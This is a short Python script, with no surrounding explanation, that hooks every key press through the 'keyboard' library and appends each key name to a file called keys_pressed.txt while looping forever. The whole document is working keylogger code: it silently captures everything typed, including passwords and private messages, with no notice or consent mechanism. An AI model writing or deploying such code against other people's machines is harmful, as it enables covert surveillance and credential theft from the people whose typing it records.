import keyboard

keys_pressed = []

def on_key_press(event):
    global keys_pressed

    keys_pressed.append(event.name)
    with open("keys_pressed.txt", "a") as f:
        f.write(event.name + "\n")

keyboard.on_press(on_key_press)

# keep the program running
while True:
    pass
